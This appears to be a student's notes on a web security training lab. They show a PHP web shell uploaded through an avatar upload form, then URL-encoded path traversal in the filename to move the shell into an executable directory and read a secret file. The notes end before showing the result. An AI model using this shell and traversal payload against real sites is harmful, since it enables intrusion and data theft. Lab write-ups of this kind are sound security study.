vulnerable path: /my-account/
vulnerable function : avatar uploading function

upload the shell script

intercept this request and send it to the repeater 

script: 
filename: lab_3_shell.php
->
<? php echo file_get_contents('/home/carlos/secret'); ?>
<-
response -> The file avatars/lab_3_shell.php has been uploaded. <-

when trying to access the file through this path "/files/avatars/lab_3_shell.php"
it shows nothing 

now let's go to the upload request in the repeater and analyse the request 
to see if it's vulnerable to directory traversal

in the request if you changed the filename to "../lab_3_shell.php"
response -> The file avatars/lab_3_shell.php has been uploaded. <-
that means it's vulnerable to directory traversal

now let's go to /files/avatars/lab_3_shell.php
the response still nothing

in the request change the filename to "%2e%2e%2flab_3_shell.php"
response -> the file avatars/../lab_3_shell.php has been uploaded. <-

now let's go to /files/lab_3_shell.php
